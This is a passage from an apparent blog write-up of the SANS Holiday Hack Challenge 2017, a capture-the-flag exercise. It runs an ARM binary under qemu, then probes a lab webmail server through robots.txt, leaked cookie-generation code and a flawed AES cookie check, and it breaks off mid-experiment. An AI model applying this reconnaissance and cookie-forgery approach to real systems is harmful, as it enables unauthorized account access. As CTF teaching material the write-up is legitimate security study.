&lt;span class="go"&gt;/usr/bin/qemu-x86_64&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-mipsn32el&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-ppc64abi32&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-sh4&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-i386&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-ppc&lt;/span&gt;
&lt;span class="go"&gt;/usr/bin/qemu-or32&lt;/span&gt;
&lt;span class="go"&gt;[snip]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Yes, &lt;code&gt;qemu-arm&lt;/code&gt; is present, we can try and launch our program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;elf@a6b0a5dfef57:~$&lt;/span&gt; /usr/bin/qemu-arm ./trainstartup
&lt;span class="go"&gt;Starting up...&lt;/span&gt;

&lt;span class="go"&gt;    Merry Christmas&lt;/span&gt;
&lt;span class="go"&gt;    Merry Christmas&lt;/span&gt;
&lt;span class="go"&gt;v&lt;/span&gt;
&lt;span class="gp"&gt;&amp;gt;&lt;/span&gt;*&amp;lt;
&lt;span class="go"&gt;^&lt;/span&gt;
&lt;span class="go"&gt;/o\&lt;/span&gt;
&lt;span class="go"&gt;/   \               @.·&lt;/span&gt;
&lt;span class="go"&gt;/~~   \                .&lt;/span&gt;
&lt;span class="go"&gt;/ ° ~~  \         · .&lt;/span&gt;
&lt;span class="go"&gt;/      ~~ \       ◆  ·&lt;/span&gt;
&lt;span class="go"&gt;/     °   ~~\    ·     0&lt;/span&gt;
&lt;span class="go"&gt;/~~           \   .─··─ · o&lt;/span&gt;
&lt;span class="go"&gt;             /°  ~~  .*· · . \  ├──┼──┤&lt;/span&gt;
&lt;span class="go"&gt;              │  ──┬─°─┬─°─°─°─ └──┴──┘&lt;/span&gt;
&lt;span class="go"&gt;≠==≠==≠==≠==──┼──=≠     ≠=≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠===≠&lt;/span&gt;
&lt;span class="go"&gt;              │   /└───┘\┌───┐       ┌┐&lt;/span&gt;
&lt;span class="go"&gt;                         └───┘    /▒▒▒▒&lt;/span&gt;
&lt;span class="go"&gt;≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠=°≠=°≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠==≠&lt;/span&gt;
&lt;span class="go"&gt;You did it! Thank you!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="id7"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id37"&gt;Redirecting the snowball&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;Since we managed to execute the program, we're given an object: Jam, which
does... something? I dunno, but apparently it should not be confused with
reindeer droppings.&lt;/p&gt;
&lt;img alt="there_s_snow_place_like_home_terminal.png" class="align-center" src="/images/sans-christmas-challenge-2017/there_s_snow_place_like_home_terminal.png" /&gt;
&lt;p&gt;Now here's the layout I used to redirect the snowball:&lt;/p&gt;
&lt;img alt="there_s_snow_place_like_home_snowball.gif" class="align-center" src="/images/sans-christmas-challenge-2017/there_s_snow_place_like_home_snowball.gif" /&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="north-pole-christmas-town-infrastructure-elf-web-access"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id38"&gt;North Pole Christmas Town infrastructure: Elf Web Access&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;If we take another look at the &lt;code&gt;nmap&lt;/code&gt; scan result, we can find a server
called &lt;code&gt;mail.northpolechristmastown.com&lt;/code&gt;. This is obviously the North
Pole mail server. Let's see what we can find.&lt;/p&gt;
&lt;p&gt;If we try to connect with Alabaster's password, we get an &lt;code&gt;Incorrect
password&lt;/code&gt; message. Great, the guy reuses his password for his MySQL account,
his system account, and his SMB account, but not his mail account. Let's find
another way.&lt;/p&gt;
&lt;img alt="ewa_failed_login.png" class="align-center" src="/images/sans-christmas-challenge-2017/ewa_failed_login.png" /&gt;
&lt;p&gt;After trying to bypass authentication for quite some time, I decided to go
back to basic recon. By looking at the source code of the application, we
find a reference to a webpage called &lt;code&gt;account.html&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// File custom.js&lt;/span&gt;
&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;login&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#email&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;val&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nx"&gt;trim&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;passw&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;val&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="nx"&gt;trim&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;address&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;passw&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="nx"&gt;address&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;match&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/[\w\_\-\.]+\@[\w\_\-\.]+\.\w\w\w?\w?/g&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!==&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;login.js&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;email&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;address&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;password&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;passw&lt;/span&gt; &lt;span class="p"&gt;}).&lt;/span&gt;&lt;span class="nx"&gt;done&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="c1"&gt;//RETURN A JSON bool value of true if the email and password is correct. false if incorrect&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;bool&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#email&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;val&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="nx"&gt;$&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;#password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;val&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="nx"&gt;Materialize&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toast&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Correct. Logging in now!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="nx"&gt;setTimeout&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(){&lt;/span&gt;
                    &lt;span class="c1"&gt;//redirect to home.html. This needs to be locked down by cookies!&lt;/span&gt;
&lt;span class="hll"&gt;                    &lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;href&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;account.html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;                &lt;span class="p"&gt;},&lt;/span&gt; &lt;span class="mi"&gt;1000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nx"&gt;Materialize&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toast&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}).&lt;/span&gt;&lt;span class="nx"&gt;fail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;Materialize&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toast&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Error: &amp;#39;&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;status&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;statusText&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;})&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nx"&gt;Materialize&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;toast&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;You must put in a correct email and password!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;4000&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But trying to go directly to this page just redirects us to the login page.
Let's continue our recon. Here's what we find in the &lt;code&gt;robots.txt&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nf"&gt;GET&lt;/span&gt; &lt;span class="nn"&gt;/robots.txt&lt;/span&gt; &lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt;
&lt;span class="na"&gt;Host&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;10.142.0.5&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="na"&gt;Cookie&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;EWA={&amp;quot;name&amp;quot;:&amp;quot;GUEST&amp;quot;,&amp;quot;plaintext&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;ciphertext&amp;quot;:&amp;quot;&amp;quot;}&lt;/span&gt;
&lt;/span&gt;&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kr"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="m"&gt;1.1&lt;/span&gt; &lt;span class="m"&gt;200&lt;/span&gt; &lt;span class="ne"&gt;OK&lt;/span&gt;
&lt;span class="na"&gt;Server&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;nginx/1.10.3 (Ubuntu)&lt;/span&gt;
&lt;span class="na"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Thu, 28 Dec 2017 20:29:07 GMT&lt;/span&gt;
&lt;span class="na"&gt;Content-Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;text/plain; charset=UTF-8&lt;/span&gt;
&lt;span class="na"&gt;Content-Length&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;37&lt;/span&gt;
&lt;span class="na"&gt;Connection&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;close&lt;/span&gt;
&lt;span class="hll"&gt;&lt;span class="na"&gt;X-Powered-By&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="l"&gt;Express&lt;/span&gt;
&lt;/span&gt;
User-agent: *
&lt;span class="hll"&gt;Disallow: /cookie.txt
&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Couple of interesting things. First, the application set us a cookie called
&lt;code&gt;EWA&lt;/code&gt;, with what seems to be our access level. I tried replaying the
cookie with values such as &lt;code&gt;ADMIN&lt;/code&gt;, etc. but it didn't work. Second, the
application is using the Express framework, which is based on NodeJS. We
now know the backend of the application. And finally, there is a file called
&lt;code&gt;cookie.txt&lt;/code&gt; in the application webroot, and the developper didn't want
this file to be indexed by search engine bots. So I guess it must be
interesting! Let's see.&lt;/p&gt;
&lt;p&gt;The file contains the following Javascript code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;//FOUND THESE FOR creating and validating cookies. Going to use this in node js&lt;/span&gt;
    &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;cookie_maker&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;need to put any length key in here&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="c1"&gt;//randomly generates a string of 5 characters&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;plaintext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;rando_string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="c1"&gt;//makes the string into cipher text .... in base64. When decoded this 21 bytes in total length. 16 bytes for IV and 5 byte of random characters&lt;/span&gt;
        &lt;span class="c1"&gt;//Removes equals from output so as not to mess up cookie. decrypt function can account for this without erroring out.&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;ciphertext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;aes256&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;encrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;plaintext&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/\=/g&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="c1"&gt;//Setting the values of the cookie.&lt;/span&gt;
        &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;acookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;IOTECHWEBMAIL&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;stringify&lt;/span&gt;&lt;span class="p"&gt;({&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;plaintext&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;plaintext&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  &lt;span class="s2"&gt;&amp;quot;ciphertext&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;}),&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;maxAge&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="mi"&gt;86400000&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;httpOnly&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;encode&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;String&lt;/span&gt; &lt;span class="p"&gt;}]&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;acookie&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
    &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;cookie_checker&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;){&lt;/span&gt;
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;need to put any length key in here&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="c1"&gt;//Retrieving the cookie from the request headers and parsing it as JSON&lt;/span&gt;
            &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;thecookie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;JSON&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;parse&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;req&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;cookies&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;IOTECHWEBMAIL&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="c1"&gt;//Retrieving the cipher text&lt;/span&gt;
            &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;ciphertext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;thecookie&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
            &lt;span class="c1"&gt;//Retrievingin the username&lt;/span&gt;
            &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;thecookie&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;name&lt;/span&gt;
            &lt;span class="c1"&gt;//retrieving the plaintext&lt;/span&gt;
            &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;plaintext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;aes256&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;decrypt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;ciphertext&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="c1"&gt;//If the plaintext and ciphertext are the same, then it means the data was encrypted with the same key&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;plaintext&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="nx"&gt;thecookie&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;plaintext&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;username&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;e&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kc"&gt;false&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;};&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, we seem to have found the code that is use to generate the &lt;code&gt;EWA&lt;/code&gt;
cookie. Here's how it seems to work:&lt;/p&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;The server generates a five-letter random string (variable &lt;code&gt;plaintext&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;This string is encrypted using AES256 (variable &lt;code&gt;ciphertext&lt;/code&gt;, with a fixed key (variable &lt;code&gt;key&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;The username, the random string, and its encrypted value, are put in the cookie.&lt;/li&gt;
&lt;li&gt;To check the cookie, the server decrypts the encrypted value, and compares it to the random string sent in the cookie.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;At first, I tried generating a cookie, using the key &lt;code&gt;need to put any length key in here&lt;/code&gt;,
hoping that the developper had not changed this section of the source code, but
it didn't work. So we don't know the key. But there are still some glaring
errors in this cookie generation code.&lt;/p&gt;
&lt;p&gt;First, let's take a look at the &lt;a class="reference external" href="https://www.npmjs.com/package/aes256"&gt;aes256 NodeJS module&lt;/a&gt;.
I installed NodeJS and this module, and played around with it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;aes256&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;aes256&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="kc"&gt;undefined&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;my milkshake brings all the boys to the yard&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kc"&gt;undefined&lt;/span&gt;
&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;plaintext&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;1337&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="kc"&gt;undefined&lt;/span&gt;
